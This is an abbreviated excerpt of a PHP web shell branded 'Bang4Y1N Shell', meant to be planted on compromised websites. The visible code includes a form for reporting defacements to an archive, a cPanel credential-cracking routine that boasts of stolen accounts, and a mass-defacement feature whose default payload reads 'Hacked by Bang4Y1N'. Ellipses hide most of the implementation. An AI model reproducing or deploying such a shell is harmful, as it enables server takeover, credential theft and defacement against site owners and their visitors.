...
<html>
<head>
<title>[+] Bang4Y1N Shell [+]</title>
<meta name='author' content='Bang4Y1N'>
<meta charset="UTF-8">
<link rel="shortcut icon" href="http://al-list.com/favicon.ico" type="image/x-icon">
<link rel="icon" href="http://al-list.com/favicon.ico" type="image/x-icon">
<style type='text/css'>
...
function files_and_folder() {
	...
	print "</table>";
	print "<center>Copyright &copy; ".date("Y")." - <a href='https://bang4y1n.xyz/' target='_blank'>".color(1, 2, "Bang4Y1N")."</a></center>";
}
	...
	if(isset($_GET['do'])) {
		...
		elseif($_GET['do'] === "zoneh") {
			if(isset($_POST['submit']) AND $_GET['do'] === "zoneh") {
				...
				print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
		    	       Defacer: <br>
		    	       <input type='text' name='nick' size='50' value='Bang4Y1N'><br><br>
		    	       Domains: <br>
		...
		elseif($_GET['do'] == 'cpanel') {
			if($_POST['crack']) {
				...
				print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by Bang4Y1N")."</p>";
			} else {
				print "<center>
		...
		elseif($_GET['do'] === "mass") {
			if($_POST['start']) {
				...
				print "<center><form method='post'>
					   ...
					   <textarea name='script' style='width: 450px; height: 200px;'>Hacked by Bang4Y1N</textarea><br>
